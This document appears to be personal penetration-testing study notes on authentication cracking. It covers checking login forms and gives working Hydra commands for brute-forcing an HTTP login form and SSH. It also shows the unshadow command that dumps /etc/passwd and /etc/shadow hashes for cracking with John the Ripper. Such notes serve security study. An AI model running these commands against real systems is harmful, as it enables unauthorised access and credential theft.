
Authentication Cracking:

- Forms:
	
	- Check the parameters 

	- Check the method of submit (POST)

	- Where it sumbits


- Testing :

	- test the form with any user and password and see the results

	- what type of message the form sends back to the user

	- What happen to the URL when the submit button is clicked ? | Does it redirect to the the same page

Tools used :

- Hydra: use Hydra to bruteforece the login page of website(HTTP)


	>>$ hydra targetWebsite http-post-form "/login.php:user=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt  -f -v


-f tells Hyrdra to stop after it founs the user and the pass



- Hydra: use to Bruteforce SSH login 


	>>$ hydra 192.168.2.4 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -v 

	


	

John

- Linux:

	- To get the Linux hashes, firt unshadow them and use John to crack them

	- unshadow it replace the [X] mark on the /etc/passwd with the actual hash 


### Unshadow:

	- unshadow /etc/passwd /etc/shadow > hashes.txt 

	hashes is the created files to dump all the hashes there


